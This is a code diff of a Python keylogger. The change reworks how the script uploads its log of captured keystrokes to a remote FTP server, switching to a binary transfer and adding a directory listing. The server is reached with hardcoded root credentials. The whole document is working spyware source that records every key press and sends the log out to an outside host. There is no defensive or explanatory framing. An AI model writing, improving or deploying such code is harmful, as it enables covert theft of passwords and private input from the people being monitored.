@@ -4,6 +4,7 @@ import ftplib
 import os
 
 log_file = "keylog.log"
+print(log_file)
 logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s : %(message)s')
 
 key_press_data = ""
@@ -22,13 +23,16 @@ def on_press(key):
             ftp_server.connect(ftp_host, ftp_port)
             ftp_server.login("root", "root") 
             print(ftp_server.pwd())
-            print(log_file)
-            with open(log_file, 'r') as f:
-                try:
-                    ftp_server.storlines('STOR %s' % log_file, f)
-                except ftplib.all_errors as e:
-                    print(str(e))
-            ftp_server.quit()
+            print(ftp_server.retrlines('LIST'))
+            print("Preparing to transfer: %s" % log_file)
+            try:
+                file = open(log_file, 'br')
+                ftp_server.storbinary('STOR %s' % log_file, file)
+            except OSError as e:
+                print(str(e))
+            except Exception as e:
+                print(str(e))
+
         logging.info('Key {0} pressed'.format(key.char))
     except:
         logging.info('special key {0} pressed'.format(key))
